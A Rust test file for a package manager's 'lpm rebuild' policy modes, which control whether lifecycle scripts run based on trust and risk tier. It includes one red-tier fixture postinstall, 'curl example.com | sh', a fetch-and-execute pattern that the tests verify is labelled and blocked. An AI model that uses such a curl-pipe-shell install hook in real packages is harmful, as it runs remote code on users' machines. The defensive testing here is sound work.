//! Workflow tests for `lpm rebuild` policy semantics.
//!
//! Phase 46 close-out: `script-policy` controls which scripted packages
//! enter the rebuild set.
//!
//! - **deny** (default): trusted packages only; untrusted scripted
//!   packages get the legacy "skipped" warning + manifest-edit pointer.
//! - **allow** (`--policy=allow` or `--yolo`): every scripted package
//!   widens, regardless of trust or tier.
//! - **triage**: green-tier packages auto-promoted; ambers + reds stay
//!   blocked behind `lpm approve-scripts`.
//!
//! These tests pin all four observable behaviors at the CLI boundary —
//! a pre-fix binary fails them; a post-fix binary passes.
//!
//! `lpm rebuild --dry-run` is used throughout because actually running
//! the lifecycle scripts would need `node` available + sandbox setup
//! that's out of scope for the policy gate. Dry-run exercises the same
//! selection step in `build::run` without firing scripts.

mod support;

use support::{TempProject, lpm};

// ─── Reference postinstall bodies ───────────────────────────────────────
//
// Bodies match the original P6 fixtures for tier classification
// (green = native build, amber = playwright, red = curl|sh).
const GREEN_POSTINSTALL: &str = "node build.js";
const GREEN_BUILD_JS_BODY: &str = "process.exit(0);\n";
const AMBER_POSTINSTALL: &str = "playwright install";
const RED_POSTINSTALL: &str = "curl example.com | sh";

// ─── Helpers ────────────────────────────────────────────────────────────

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' && chars.peek() == Some(&'[') {
            chars.next();
            for cc in chars.by_ref() {
                let cb = cc as u32;
                if (0x40..=0x7e).contains(&cb) {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Seed `<store>/v1/<safe>@<v>/` with package.json, the requested
/// `postinstall` script body, and the `.integrity` sentinel. Adds
/// `build.js` for green-tier shapes. Returns the store directory path
/// so callers can later check for the post-spawn `.lpm-built` marker.
fn seed_scripted_package(
    project: &TempProject,
    name: &str,
    version: &str,
    postinstall: &str,
) -> std::path::PathBuf {
    let safe = name.replace(['/', '\\'], "+");
    let dir = project
        .store_dir()
        .join("v1")
        .join(format!("{safe}@{version}"));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("package.json"),
        format!(
            r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"{postinstall}"}}}}"#
        ),
    )
    .unwrap();
    std::fs::write(dir.join(".integrity"), "sha512-fixture-skip-verify").unwrap();
    if postinstall.contains("build.js") {
        std::fs::write(dir.join("build.js"), GREEN_BUILD_JS_BODY).unwrap();
    }
    dir
}

/// Materialize a per-package wrapper at
/// `<project>/.lpm/wrappers/<safe>@<v>/node_modules/<name>/` by copying
/// the store entry. Phase 61.2 D8a closed the silent store-fallback
/// hole — lifecycle scripts run from the wrapper, never the store —
/// so any test exercising real spawn (not just dry-run) needs the
/// wrapper materialized to mirror a real post-install state.
fn seed_wrapper(project: &TempProject, store_pkg_dir: &std::path::Path, name: &str, version: &str) {
    let safe = name.replace(['/', '\\'], "+");
    let wrapper_pkg = project
        .path()
        .join(".lpm")
        .join("wrappers")
        .join(format!("{safe}@{version}"))
        .join("node_modules")
        .join(name);
    std::fs::create_dir_all(wrapper_pkg.parent().unwrap()).unwrap();
    copy_dir_recursive(store_pkg_dir, &wrapper_pkg);
}

fn copy_dir_recursive(src: &std::path::Path, dst: &std::path::Path) {
    std::fs::create_dir_all(dst).unwrap();
    for entry in std::fs::read_dir(src).unwrap() {
        let entry = entry.unwrap();
        let entry_dst = dst.join(entry.file_name());
        if entry.file_type().unwrap().is_dir() {
            copy_dir_recursive(&entry.path(), &entry_dst);
        } else {
            std::fs::copy(entry.path(), &entry_dst).unwrap();
        }
    }
}

/// Detect whether `node` is on PATH. Tests that exercise real lifecycle
/// spawn (not just tier classification / dry-run) skip the spawn-side
/// assertion when Node is missing rather than failing — the suite must
/// still run in minimal containers.
fn node_available() -> bool {
    std::process::Command::new("node")
        .arg("--version")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn write_lockfile_for_packages(project: &TempProject, packages: &[(&str, &str)]) {
    let pkg_entries: Vec<String> = packages
        .iter()
        .map(|(n, v)| format!("[[packages]]\nname = \"{n}\"\nversion = \"{v}\"\n"))
        .collect();
    let toml = format!(
        "[metadata]\nlockfile-version = 2\nresolved-with = \"pubgrub\"\n\n{}\n",
        pkg_entries.join("\n")
    );
    project.write_file("lpm.lock", &toml);
}

/// Write a manifest with optional `lpm.scriptPolicy` and optional
/// `lpm.trustedDependencies` (legacy bare-name list — bypasses
/// scriptHash check).
fn write_policy_manifest(
    project: &TempProject,
    project_name: &str,
    script_policy: Option<&str>,
    trusted_deps: &[&str],
) {
    let mut lpm = serde_json::Map::new();
    if let Some(p) = script_policy {
        lpm.insert("scriptPolicy".into(), serde_json::Value::String(p.into()));
    }
    if !trusted_deps.is_empty() {
        lpm.insert(
            "trustedDependencies".into(),
            serde_json::Value::Array(
                trusted_deps
                    .iter()
                    .map(|d| serde_json::Value::String((*d).into()))
                    .collect(),
            ),
        );
    }
    let mut manifest = serde_json::json!({
        "name": project_name,
        "version": "0.0.1",
    });
    if !lpm.is_empty() {
        manifest["lpm"] = serde_json::Value::Object(lpm);
    }
    project.write_file(
        "package.json",
        &serde_json::to_string_pretty(&manifest).unwrap(),
    );
}

// ─── deny policy: default selector filters to trusted packages ──────────

/// Under `--policy=deny` (the default), `lpm rebuild --dry-run` filters
/// to packages listed in `trustedDependencies` only. JSON envelope
/// shape is locked via insta against a 2-package fixture (one trusted,
/// one untrusted) so a future schema widening fails this test.
#[tokio::test]
async fn rebuild_deny_policy_dry_run_json_envelope_matches_snapshot() {
    let project = TempProject::empty("");
    write_policy_manifest(
        &project,
        "rebuild-deny-baseline",
        None, // no scriptPolicy → default deny
        &["trusted-pkg"],
    );
    seed_scripted_package(&project, "trusted-pkg", "1.0.0", "echo hi");
    seed_scripted_package(&project, "untrusted-pkg", "1.0.0", "echo hi");
    write_lockfile_for_packages(
        &project,
        &[("trusted-pkg", "1.0.0"), ("untrusted-pkg", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--policy=deny"])
        .output()
        .expect("spawn lpm rebuild --json");
    assert!(
        out.status.success(),
        "rebuild --dry-run --policy=deny --json must exit 0; stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );

    let envelope: serde_json::Value =
        serde_json::from_str(strip_ansi(&String::from_utf8_lossy(&out.stdout)).trim())
            .unwrap_or_else(|e| panic!("stdout not valid JSON: {e}"));

    insta::assert_json_snapshot!("rebuild_deny_policy_dry_run_envelope", envelope);
}

/// JSON envelope shape sanity: `dry_run = true`, exactly one entry in
/// `packages[]` (the trusted one), trust flag set. Pairs with the
/// snapshot above.
#[tokio::test]
async fn rebuild_deny_policy_dry_run_filters_to_trusted_only() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-deny-filter", None, &["trusted-pkg"]);
    seed_scripted_package(&project, "trusted-pkg", "1.0.0", "echo hi");
    seed_scripted_package(&project, "untrusted-pkg", "1.0.0", "echo hi");
    write_lockfile_for_packages(
        &project,
        &[("trusted-pkg", "1.0.0"), ("untrusted-pkg", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--policy=deny"])
        .output()
        .expect("spawn lpm rebuild --json");
    assert!(out.status.success());

    let parsed: serde_json::Value =
        serde_json::from_str(strip_ansi(&String::from_utf8_lossy(&out.stdout)).trim())
            .unwrap_or_else(|e| panic!("stdout not valid JSON: {e}"));
    assert_eq!(parsed["dry_run"].as_bool(), Some(true));
    let packages = parsed["packages"]
        .as_array()
        .expect("packages array must be present");
    assert_eq!(
        packages.len(),
        1,
        "deny filter must include only the trusted package; got: {parsed}"
    );
    assert_eq!(packages[0]["name"].as_str(), Some("trusted-pkg"));
    assert_eq!(packages[0]["trusted"].as_bool(), Some(true));
}

// ─── allow policy: selector widens to every scripted package ────────────

/// Under `lpm.scriptPolicy = "allow"` in package.json, the default
/// `lpm rebuild --dry-run` (no `--all`, no named packages, no manifest
/// `trustedDependencies`) must include every scripted package — green,
/// amber, AND red — because allow runs every lifecycle script without
/// the triage gate. Pre-Chunk-2 the selection step filtered to trusted-
/// only, so allow behaved identically to deny at the CLI boundary.
#[test]
fn rebuild_allow_policy_widens_to_every_scripted_package() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-allow-manifest", Some("allow"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        out.status.success(),
        "rebuild --dry-run must exit 0 under allow; stdout:\n{stdout}\nstderr:\n{stderr}"
    );

    // All three scripted packages must appear — allow widening is
    // tier-agnostic.
    assert!(
        stdout.contains("green-native"),
        "green-native must appear under allow; stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("amber-playwright"),
        "amber-playwright must appear under allow (tier-agnostic widening); stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("red-curlpipe"),
        "red-curlpipe must appear under allow (red tier is a label, not a gate); stdout:\n{stdout}"
    );

    // The "N packages are not in trustedDependencies and will be
    // skipped" warning must NOT fire under allow — every scripted
    // package is in the build set.
    assert!(
        !stderr.contains("are not in trustedDependencies and will be skipped"),
        "the skipped-count warning must not fire under allow; stderr:\n{stderr}"
    );
}

/// Snapshot the `--policy=allow --json --dry-run` envelope so a future
/// shape drift (renamed field, new top-level key) fails this test.
/// Separate from the deny-policy snapshot above — same JSON schema,
/// different selection semantics, but the envelope's keys must stay
/// stable across both policy modes.
#[test]
fn rebuild_allow_policy_dry_run_json_envelope_matches_snapshot() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-allow-snap", Some("allow"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild --json --dry-run --policy=allow");
    assert!(out.status.success(), "rebuild --dry-run --json must exit 0");

    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let envelope: serde_json::Value = serde_json::from_str(&stdout)
        .unwrap_or_else(|e| panic!("rebuild --json must be valid JSON: {e}\n---\n{stdout}"));

    insta::with_settings!({ filters => vec![
        // Redact store dir + integrity hashes that vary across runs.
        (r#""/[^"]+/store/[^"]+""#, r#""[STORE_DIR]""#),
        (r#"sha512-[A-Za-z0-9+/=]+"#, "sha512-[REDACTED]"),
    ]}, {
        insta::assert_json_snapshot!("rebuild_allow_policy_dry_run_envelope", envelope);
    });
}

/// Same widening behavior must reach the selection step from the CLI
/// override path (`--policy=allow` AND its `--yolo` alias) — proves
/// the resolved policy from main.rs's precedence chain reaches
/// `build::run`.
#[test]
fn rebuild_allow_policy_via_cli_override_or_yolo_alias_also_widens() {
    let project = TempProject::empty("");
    // No scriptPolicy in manifest — allow signal comes purely from CLI.
    write_policy_manifest(&project, "rebuild-allow-cli", None, &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    // --policy=allow path
    let out_policy = lpm(&project)
        .args(["rebuild", "--dry-run", "--policy=allow"])
        .output()
        .expect("spawn lpm rebuild --policy=allow");
    let stdout_policy = strip_ansi(&String::from_utf8_lossy(&out_policy.stdout));
    assert!(
        out_policy.status.success(),
        "exit 0 expected; stdout:\n{stdout_policy}"
    );
    assert!(
        stdout_policy.contains("green-native") && stdout_policy.contains("amber-playwright"),
        "--policy=allow must widen at the selection step; stdout:\n{stdout_policy}"
    );

    // --yolo alias path
    let out_yolo = lpm(&project)
        .args(["rebuild", "--dry-run", "--yolo"])
        .output()
        .expect("spawn lpm rebuild --yolo");
    let stdout_yolo = strip_ansi(&String::from_utf8_lossy(&out_yolo.stdout));
    assert!(
        out_yolo.status.success(),
        "exit 0 expected; stdout:\n{stdout_yolo}"
    );
    assert!(
        stdout_yolo.contains("green-native") && stdout_yolo.contains("amber-playwright"),
        "--yolo (alias for --policy=allow) must widen too; stdout:\n{stdout_yolo}"
    );
}

// ─── deny policy control: confirms allow-fix is allow-scoped ────────────

/// Same fixture under `scriptPolicy = "deny"` keeps the pre-Chunk-2
/// selection: default branch filters to trusted-only, untrusted
/// packages are skipped with the legacy manifest-edit pointer.
/// Pins that the allow widening fix doesn't regress deny mode.
#[test]
fn rebuild_deny_policy_keeps_trusted_only_filter() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-deny-control", Some("deny"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(out.status.success(), "exit 0 expected; stdout:\n{stdout}");

    // No trusted entries + no --all → empty default set under deny.
    assert!(
        !stdout.contains("green-native"),
        "deny must filter out untrusted-by-default scripted packages; stdout:\n{stdout}"
    );
    assert!(
        !stdout.contains("amber-playwright"),
        "deny must filter out untrusted-by-default; stdout:\n{stdout}"
    );

    // Skipped-count warning fires + legacy pointer.
    assert!(
        stderr.contains("2 package(s) are not in trustedDependencies"),
        "skipped-count warning must fire under deny; stderr:\n{stderr}"
    );
    assert!(
        stderr.contains("package.json > lpm > trustedDependencies")
            || stderr.contains("lpm rebuild --all"),
        "deny keeps the legacy manifest-edit pointer; stderr:\n{stderr}"
    );
}

// ─── triage policy control: green-only promotion, amber/red blocked ─────

/// Triage promotes greens at the helper level only; the selection step
/// still filters to trusted-only. With amber + red and no green, the
/// dry-run set is empty AND users get pointed at `lpm approve-scripts`.
/// Pins that the allow fix is allow-scoped — triage isn't accidentally
/// widened too.
#[test]
fn rebuild_triage_policy_does_not_widen_beyond_greens() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-control", Some("triage"), &[]);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("amber-playwright", "1.0.0"), ("red-curlpipe", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(out.status.success(), "exit 0 expected; stdout:\n{stdout}");

    assert!(
        !stdout.contains("amber-playwright") && !stdout.contains("red-curlpipe"),
        "triage must NOT widen amber/red at the selection step (green-only promotion); stdout:\n{stdout}"
    );
    assert!(
        stderr.contains("lpm approve-scripts"),
        "triage with amber+red must point users at approve-scripts; stderr:\n{stderr}"
    );
}

// ─── triage policy: green auto-promotion + amber/red blocked ────────────
//
// Five tests covering the §11 P6 ship criteria for triage:
//  1. default filter keeps only green-promoted packages in the dry-run
//     set (proves the promotion survives `build::run`'s trust filter,
//     not just the label renderer)
//  2. `--all` widens to every scriptable package; greens render with
//     the "(green-tier auto-approval)" suffix; amber/red show as
//     "not trusted"
//  3. real `lpm rebuild` (no dry-run) auto-builds the green and
//     points users at `lpm approve-scripts` for amber/red
//  4. control: deny doesn't promote anything, keeps the legacy
//     manifest-edit pointer
//  5. `--json` envelope is parseable and stream-separated (no human
//     pointer text bleeds onto stdout)

/// Default filter under triage (`lpm rebuild --dry-run`, no `--all`,
/// no named packages) keeps ONLY the green-promoted package in the
/// build set — pre-Chunk-2 the renderer might have labeled greens as
/// "trusted" but the selection step still excluded them.
#[test]
fn rebuild_triage_default_dryrun_filter_keeps_only_green_promoted() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-default", Some("triage"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        out.status.success(),
        "rebuild --dry-run must exit 0 under triage; stdout:\n{stdout}\nstderr:\n{stderr}"
    );

    assert!(
        stdout.contains("green-native"),
        "green-native must appear in default-filter dry-run; stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("green-tier auto-approval"),
        "green-tier suffix must render when the promoted package passes the filter; stdout:\n{stdout}"
    );
    assert!(
        !stdout.contains("amber-playwright"),
        "amber-playwright must NOT appear (Chunk 2 promotion is green-only); stdout:\n{stdout}"
    );
    assert!(
        !stdout.contains("red-curlpipe"),
        "red-curlpipe must NOT appear in default-filter dry-run; stdout:\n{stdout}"
    );
}

/// `--all` widens to every scriptable package regardless of trust.
/// Greens render with the "(green-tier auto-approval)" suffix; amber
/// and red show as "not trusted" — proves tier-promotion labelling is
/// green-only even when the filter is bypassed.
#[test]
fn rebuild_triage_dry_run_all_labels_green_with_promotion_suffix() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-all", Some("triage"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["rebuild", "--dry-run", "--all"])
        .output()
        .expect("spawn lpm rebuild");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    assert!(
        out.status.success(),
        "rebuild --dry-run --all must exit 0; stdout:\n{stdout}"
    );

    // All three present (--all bypasses trust filter at selection time).
    assert!(stdout.contains("green-native"), "stdout:\n{stdout}");
    assert!(stdout.contains("amber-playwright"), "stdout:\n{stdout}");
    assert!(stdout.contains("red-curlpipe"), "stdout:\n{stdout}");

    // Green carries the promotion suffix.
    assert!(
        stdout.contains("green-tier auto-approval"),
        "green-native must carry the green-tier promotion suffix; stdout:\n{stdout}"
    );

    // Amber + red render as "not trusted" — promotion is green-only.
    let not_trusted_count = stdout.matches("not trusted").count();
    assert!(
        not_trusted_count >= 2,
        "amber + red must both render as 'not trusted' (promotion is green-only); stdout:\n{stdout}"
    );
}

/// Real `lpm rebuild` (no dry-run) auto-builds green packages under
/// triage and points users at `lpm approve-scripts` for the amber/red
/// remainder. Green-spawn assertion is gated on `node` availability so
/// the suite still runs in minimal containers.
#[test]
fn rebuild_triage_default_build_points_at_approve_scripts_for_blocked() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-build", Some("triage"), &[]);
    let green_dir = seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    let amber_dir = seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    let red_dir = seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    // Phase 61.2 D8a: lifecycle scripts run from the wrapper, never
    // the store — materialize wrappers to mirror real post-install.
    seed_wrapper(&project, &green_dir, "green-native", "1.0.0");
    seed_wrapper(&project, &amber_dir, "amber-playwright", "1.0.0");
    seed_wrapper(&project, &red_dir, "red-curlpipe", "1.0.0");
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["rebuild"])
        .output()
        .expect("spawn lpm rebuild");
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));

    // Amber + red must NOT auto-build under triage.
    assert!(
        !amber_dir.join(".lpm-built").exists(),
        "amber package must not auto-build under triage (requires explicit review)"
    );
    assert!(
        !red_dir.join(".lpm-built").exists(),
        "red package must never auto-build"
    );

    // Pointer surfaces with the skipped count.
    assert!(
        stderr.contains("lpm approve-scripts"),
        "Chunk 1 triage pointer must appear when amber/red remain; stderr:\n{stderr}"
    );
    assert!(
        stderr.contains("2 package(s) are not in trustedDependencies"),
        "skipped-count line must name 2 (amber + red); stderr:\n{stderr}"
    );

    // Green-spawn assertion only when node is available.
    if node_available() {
        assert!(
            green_dir.join(".lpm-built").exists(),
            "with node available, green-tier postinstall must complete under triage + sandbox; stderr:\n{stderr}"
        );
    }
}

/// Control: under deny, the same fixture produces no tier promotion.
/// The classifier still classifies (it's policy-agnostic), but
/// `evaluate_trust` returns `Untrusted` so the package is skipped and
/// the legacy manifest-edit pointer fires (NOT the triage-specific
/// approve-scripts pointer).
#[test]
fn rebuild_deny_skips_all_packages_and_keeps_legacy_pointer() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-deny-skips", Some("deny"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["rebuild"])
        .output()
        .expect("spawn lpm rebuild");
    assert!(out.status.success(), "rebuild must exit 0 under deny too");

    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        stderr.contains("package.json > lpm > trustedDependencies")
            || stderr.contains("lpm rebuild --all"),
        "deny must keep the legacy manifest-edit pointer; stderr:\n{stderr}"
    );
    assert!(
        !stderr.contains("Run `lpm approve-scripts` to review"),
        "deny must NOT emit the triage-specific approve-scripts pointer"
    );
}

/// `--json` envelope is valid JSON on stdout; no human pointer text
/// bleeds onto stdout (Chunk 4 stream-separation contract). A regression
/// that emitted the approve-scripts pointer to stdout under `--json`
/// would break `JSON.parse` for every CI consumer.
#[test]
fn rebuild_triage_json_separates_streams() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-json", Some("triage"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--all"])
        .output()
        .expect("spawn lpm rebuild --json");

    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
        .unwrap_or_else(|e| panic!("rebuild --json --dry-run stdout must be parseable JSON. Parse error: {e}\nstdout:\n{stdout}"));
    let packages = parsed["packages"]
        .as_array()
        .expect("rebuild --json --dry-run must expose `packages` array");
    assert_eq!(
        packages.len(),
        2,
        "both fixture packages must appear in the JSON dry-run output; got: {parsed}"
    );
}

// ─── Phase 46.1 GPT-5 audit round 2 (2026-05-11): strict + sandbox-log ──
//
// `--strict-sandbox` and `--sandbox-log` are NOT clap-rejected (they
// have orthogonal-looking intents: one wants enforcement, the other
// wants observation). When both arrive, `decide_runtime_sandbox_mode`
// collapses to `SandboxMode::LogOnly` (the user explicitly asked to
// observe). Pre-fix the install pipeline then emitted BOTH banners:
//
//   ! strict-sandbox: outbound network will be denied for every lifecycle script ...
//   ! --sandbox-log: diagnostic mode only. Rule triggers are logged but NOT enforced ...
//
// — a contradictory pair. The fix gates the strict banner on the final
// `SandboxMode::Enforce`; under LogOnly only the sandbox-log banner
// fires. This test exercises that wiring end-to-end and pins the
// contract so a future change that re-broadens the strict banner
// trips this assertion directly.
//
// macOS-only: Linux landlock has no native observe-only primitive,
// so `--sandbox-log` errors at the pre-probe with
// `ModeNotSupportedOnPlatform` BEFORE the banner code runs — there's
// nothing to assert about banner truthfulness on Linux.
#[cfg(target_os = "macos")]
#[test]
fn rebuild_strict_plus_sandbox_log_suppresses_strict_banner_under_logonly() {
    if !node_available() {
        // Skip: this test needs a real spawn (not dry-run) to reach
        // the banner site. Mirrors the soft-pass pattern used by
        // other rebuild tests that exercise lifecycle scripts.
        eprintln!(
            "skipping rebuild_strict_plus_sandbox_log_suppresses_strict_banner_under_logonly: node not on PATH"
        );
        return;
    }
    let project = TempProject::empty("");
    write_policy_manifest(
        &project,
        "rebuild-strict-plus-sandbox-log",
        None, // deny default — but we'll trust the package below
        &["green-pkg"],
    );
    let store_pkg = seed_scripted_package(&project, "green-pkg", "1.0.0", GREEN_POSTINSTALL);
    seed_wrapper(&project, &store_pkg, "green-pkg", "1.0.0");
    write_lockfile_for_packages(&project, &[("green-pkg", "1.0.0")]);

    let out = lpm(&project)
        .args(["rebuild", "--strict-sandbox", "--sandbox-log"])
        .output()
        .expect("spawn lpm rebuild --strict-sandbox --sandbox-log");

    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));

    // The pair must parse (clap deliberately allows both — the
    // mutex would prevent legitimate env/config strict + CLI
    // sandbox-log combinations from being expressible).
    assert!(
        out.status.success() || stderr.contains("rebuild"),
        "rebuild --strict-sandbox --sandbox-log must reach the rebuild pipeline (success or \
         normal rebuild output). exit={:?}\nstdout:\n{stdout}\nstderr:\n{stderr}",
        out.status,
    );

    // The sandbox-log banner MUST appear — LogOnly is the actual
    // runtime mode, and users need to know rules are observed not
    // enforced.
    assert!(
        stderr.contains("--sandbox-log: diagnostic mode only"),
        "sandbox-log banner must fire under --sandbox-log (LogOnly is the active mode). \
         stderr:\n{stderr}",
    );

    // The strict-sandbox banner MUST NOT appear — saying "outbound \
    // network will be denied" alongside the sandbox-log "logged but \
    // NOT enforced" line is contradictory and the bug GPT-5 caught.
    assert!(
        !stderr.contains("strict-sandbox: outbound network will be denied"),
        "strict-sandbox banner MUST suppress itself under LogOnly — pre-fix it lied about \
         enforcement. GPT-5 audit round 2 finding. stderr:\n{stderr}",
    );
}
